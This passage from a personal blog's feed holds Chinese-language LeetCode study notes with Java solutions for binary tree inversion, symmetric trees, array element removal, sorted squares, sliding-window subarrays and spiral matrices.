id="DFS（递归）"><a href="#DFS（递归）" class="headerlink" title="DFS（递归）"></a>DFS（递归）</h6><p>注意前序遍历和后序遍历可以，中序遍历不行（不信你就画图推推看）<br>前序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left= root.right ;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 后序遍历：先递归地翻转左右子树</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> invertTree(root.left);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> invertTree(root.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 交换左右子树</span></span><br><span class="line">        root.left = right;</span><br><span class="line">        root.right = left;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;deque.offer(node.left);&#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;deque.offer(node.right);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p>人机有话说.<br><strong>DFS 和 BFS 的区别</strong></p><ol><li><strong>遍历顺序</strong><ul><li><strong>DFS（Depth First Search，深度优先搜索）</strong>：优先深入到每个节点的子节点，通常会先访问到某个分支的最底层节点，然后再回溯到上层节点去访问其他分支。常见的 DFS 实现有三种：前序遍历（Preorder）、中序遍历（Inorder）、后序遍历（Postorder）。</li><li><strong>BFS（Breadth First Search，广度优先搜索）</strong>：优先访问每一层的节点，然后再逐层深入。BFS 一般使用队列（<code>Queue</code>）来实现，按层次逐一处理节点。</li></ul></li><li><strong>数据结构</strong><ul><li><strong>DFS</strong>：常用递归或栈来实现，递归会隐式使用系统栈，而非递归的实现需要显式的栈。</li><li><strong>BFS</strong>：通常使用队列来实现，因为它按照层次顺序访问节点。</li></ul></li><li><strong>时间复杂度和空间复杂度</strong><ul><li><strong>时间复杂度</strong>：DFS 和 BFS 的时间复杂度都是 O(n)，其中 nnn 是节点的数量，因为每个节点都需要被访问一次。</li><li><strong>空间复杂度</strong>：DFS 的空间复杂度取决于递归的深度，最坏情况下是 O(h)（树的高度）；BFS 的空间复杂度则是 O(w)，其中 w是树的最大宽度。</li></ul></li></ol><h4 id="对称二叉树"><a href="#对称二叉树" class="headerlink" title="对称二叉树"></a>对称二叉树</h4><p>link：<a href="https://leetcode.cn/problems/symmetric-tree/description/">101. 对称二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目确实觉得很对称啊，看图分析左子树和右子树的遍历顺序，左子树是左右中，那和右子树比较的时候就是右左中.<br>特殊情况优先考虑<br>左空右空-&gt;true<br>左不空右空-&gt;false<br>左空右不空-&gt;false<br>那最后的情况就是左右都不为空了，这时候就需要单独判断.<br>单侧不对称就可以返回false.<br>那么这么比较就只能是后序遍历了.<br>递归秒！</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cmp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">cmp</span><span class="params">(TreeNode left,TreeNode right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right.val != left.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">last</span> <span class="operator">=</span> cmp(left.left,right.right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lastnext</span> <span class="operator">=</span> cmp(left.right,right.left);</span><br><span class="line">        <span class="keyword">return</span> last &amp;&amp; lastnext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>不要else if判断结束之后直接else{return true;}<br>这样做的话没有判断其他剩余的子节点 ，意味着中层节点的值心相等，但是叶子节点的值不通，但仍然判断这种情况为true，这样是不对的.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二叉树的层序遍历（广度优先遍历）&quot;&gt;&lt;a href=&quot;#二叉树的层序遍历（广度优先遍历）&quot; class=&quot;headerlink&quot; title=&quot;二叉树的层序遍历（广度优先遍历）&quot;&gt;&lt;/a&gt;二叉树的层序遍历（广度优先遍历）&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x2</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x2/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x2/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:08:42.972Z</updated>
    
    <content type="html"><![CDATA[<h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-element/solutions/1689028/by-carlsun-2-fdc4/">27. 移除元素 - 力扣（LeetCode）</a></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240925141403675.png" alt="image-20240925141403675"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>1.常规遍历数组，比较vaule值是否相等，若不相等往前拷贝覆盖即可，相等跳过，更新下标（可以理解为数组长度减少）.【时间复杂度O(n) 空间复杂度O(1)】<br>2.快慢指针.快指针遍历进行筛选，慢指针对应常见存储的数组.找到目标vaule后fast和slow指针拉开距离开始遍历维护更新.【时间复杂度O(n) 空间复杂度O(1)】</p><h6 id="拷贝覆盖"><a href="#拷贝覆盖" class="headerlink" title="拷贝覆盖"></a>拷贝覆盖</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">          <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)&#123;</span><br><span class="line">                nums[k] = num;</span><br><span class="line">                k++; </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(slow = <span class="number">0</span>; fast &lt; nums.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != val)&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p>注意多种思路辨析.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;移除元素&quot;&gt;&lt;a href=&quot;#移除元素&quot; class=&quot;headerlink&quot; title=&quot;移除元素&quot;&gt;&lt;/a&gt;移除元素&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/remove-element/solu</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x3</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x3/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x3/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T05:53:26.311Z</updated>
    
    <content type="html"><![CDATA[<h4 id="有序数组的平方"><a href="#有序数组的平方" class="headerlink" title="有序数组的平方"></a>有序数组的平方</h4><p>link：<a href="https://leetcode.cn/problems/squares-of-a-sorted-array/description/">977. 有序数组的平方 - 力扣（LeetCode）</a><br><strong>非递减顺序</strong><br>一个数列中的元素从左到右依次不减，或者说不降序排列.<br>比如：1233445，12345.</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>如果看到数组能条件反射到双指针那已经是win了.<br>根据题意平方之后的数一定在数组的两端.两个指针一首一尾，从后往前更新数组.<br><img src="D:\Users\lenovo\Desktop\无标题-2024-10-02-1521.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortedSquares(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">      <span class="comment">//非递减数组可得最大值平方后会出现在数组两头</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> result.length - <span class="number">1</span> ;</span><br><span class="line">      <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[left]*nums[left] &gt; nums[right]*nums[right]) &#123;</span><br><span class="line">            result[index--] = nums[left] * nums[left++];</span><br><span class="line">           <span class="comment">// left++;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             result[index--] = nums[right] * nums[right--];</span><br><span class="line">            <span class="comment">//right--;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="长度最小的子数组"><a href="#长度最小的子数组" class="headerlink" title="长度最小的子数组"></a>长度最小的子数组</h4><p>link：<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. 长度最小的子数组 - 力扣（LeetCode）</a></p><p><strong>双指针变形——滑动窗口</strong><br>其实也可以理解成给入队的队列一个给定的大小变成窗口，先入队元素，然后和target进行比较，大于等于target就出队先进的元素，再进新元素并且标记好原来大于等于target的数组长度.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//起始位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//滑动窗口值总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;<span class="comment">//定义最大值 遍历不出错</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt; nums.length;end++) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span>(sum &gt;= target) &#123;</span><br><span class="line">                result = Math.min(result, end - begin + <span class="number">1</span>);<span class="comment">//最小长度</span></span><br><span class="line">                sum -= nums[begin++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span> : result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点：如何移动起始位置</strong><br>如果循环中的标记位在起始位置，起始位置和终止位置都需要移动一遍和暴力解法无差别，所以我们的标记位一定是终止位.</p><h4 id="螺旋矩阵-II"><a href="#螺旋矩阵-II" class="headerlink" title="螺旋矩阵 II"></a>螺旋矩阵 II</h4><p>link：<a href="https://leetcode.cn/problems/spiral-matrix-ii/description/">59. 螺旋矩阵 II - 力扣（LeetCode）</a><br>奇怪的代码掌控力… 主要问题在<strong>边界处理</strong></p><h6 id="顺序解决"><a href="#顺序解决" class="headerlink" title="顺序解决"></a>顺序解决</h6><p>按照本来的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>,r = n - <span class="number">1</span>,t = <span class="number">0</span>,b = n-<span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span>[][] result = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">     <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span> <span class="variable">tar</span> <span class="operator">=</span> n * n;</span><br><span class="line">     <span class="keyword">while</span>(num &lt;= tar) &#123;</span><br><span class="line">     <span class="comment">//第一行开始</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;i &lt;= r;i++)&#123;</span><br><span class="line">        result[t][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     t++;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> t; i &lt;= b; i++)&#123;</span><br><span class="line">        result[i][r] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     r--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r; i &gt;=l; i--)&#123;</span><br><span class="line">        result[b][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     b--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b;i &gt;= t;i--) &#123;</span><br><span class="line">        result[i][l] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     l++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="改编版本"><a href="#改编版本" class="headerlink" title="改编版本"></a>改编版本</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 控制循环次数</span></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 每次循环的开始点(start, start)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// 定义填充数字</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (loop++ &lt; n / <span class="number">2</span>) &#123; <span class="comment">// 判断边界后，loop从1开始</span></span><br><span class="line">            <span class="comment">// 模拟上侧从左到右</span></span><br><span class="line">            <span class="keyword">for</span> (j = start; j &lt; n - loop; j++) &#123;</span><br><span class="line">                res[start][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟右侧从上到下</span></span><br><span class="line">            <span class="keyword">for</span> (i = start; i &lt; n - loop; i++) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟下侧从右到左</span></span><br><span class="line">            <span class="keyword">for</span> (; j &gt;= loop; j--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟左侧从下到上</span></span><br><span class="line">            <span class="keyword">for</span> (; i &gt;= loop; i--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            res[start][start] = count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>1.遇到有序数组考虑二分法.<br>2.双指针（找准循环不变量中的不变量）.<br>3.求连续子数组的总和可用滑动窗口解决.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;有序数组的平方&quot;&gt;&lt;a href=&quot;#有序数组的平方&quot; class=&quot;headerlink&quot; title=&quot;有序数组的平方&quot;&gt;&lt;/a&gt;有序数组的平方&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/squares</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x4</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x4/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x4/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:25:05.644Z</updated>
    
